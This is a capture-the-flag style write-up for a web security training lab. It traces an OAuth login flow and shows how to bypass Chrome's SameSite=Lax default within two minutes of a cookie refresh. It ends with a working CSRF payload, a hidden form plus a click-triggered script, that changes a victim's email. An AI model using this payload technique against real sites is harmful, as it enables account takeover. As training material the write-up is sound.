This lab's change email function is vulnerable to CSRF. To solve the lab, perform a CSRF attack that changes the victim's email address. You should use the provided exploit server to host your attack.

The lab supports OAuth-based login. You can log in via your social media account with the following credentials: wiener:peter 

# Solution

Login

```http
GET /social-login
Host: LAB-ID.web-security-academy.net
```
- 200 - redirect to oauth login


oauth login flow
```http
GET /auth?client_id=ttgf8triqe8jmqze64xfz&redirect_uri=https://0a16006b03f0dbd980af268100d700fc.web-security-academy.net/oauth-callback&response_type=code&scope=openid%20profile%20email HTTP/1.1
Host: oauth-0a7f009403efdbe88052244d02e7001f.oauth-server.net
```
- 302 - redirect to oauth server login page


oauth login page
```http
GET /interaction/LnB-KI1z12UHi99L9ShYx HTTP/2
Host: oauth-0a7f009403efdbe88052244d02e7001f.oauth-server.net
Cookie: _interaction=LnB-KI1z12UHi99L9ShYx
```
- 200 - sign-in form

sign-in oauth
```http
POST /interaction/LnB-KI1z12UHi99L9ShYx/login HTTP/2
Host: oauth-0a7f009403efdbe88052244d02e7001f.oauth-server.net
Cookie: _interaction=LnB-KI1z12UHi99L9ShYx
...
username=wiener&password=peter
```
- 302

after POST /interation/..., oauth flow will make a callback to web server
```http
GET /oauth-callback?code=IesgCtIOgwk9dwLLUtfnIDevzbgHLaAfgD4nYcOyHW8 HTTP/2
Host: 0a16006b03f0dbd980af268100d700fc.web-security-academy.net
```

Response:
```http
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Set-Cookie: session=pbZt34N9eNYRsihlyQdd0y7CLKkfICJU; Expires=Fri, 23 Aug 2024 02:45:06 UTC; Secure; HttpOnly
X-Frame-Options: SAMEORIGIN
...
```
- session cookie set but no samesite attribute set

Notes:
- if a website doesn't include a `SameSite` attribute when setting a cookie, Chrome automatically applies Lax restrictions by default. However, to avoid breaking single sign-on (SSO) mechanisms, it doesn't actually enforce these restrictions for the first 2 minutes on top-level `POST` requests.


`POST /my-account/change-email`
- has no CSRF token
- cookie['session] will be set to `lax` after 2min past logging in
    - hence, CSRF attack window is within 2min the cookie['session] token is set/refreshed


We can get refresh a session cookie by calling: 
```http
GET /social-login
Host: LAB-ID.web-security-academy.net
```
- will make oauth calls resulting to `GET /oauth-callback?code=...` which will refresh the cookie['session']
    - samesite not set
    - chrome browser will set to `lax` after 2min
- requires a timeout for redirect to work

Deliver exploit to victim
```js
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="test@test">
</form>
<script>
    window.onclick = () => {
        window.open('https://YOUR-LAB-ID.web-security-academy.net/social-login');
        setTimeout(changeEmail, 6000); // for redirect to complete
    }

    function changeEmail() {
        document.forms[0].submit();
    }
</script>
```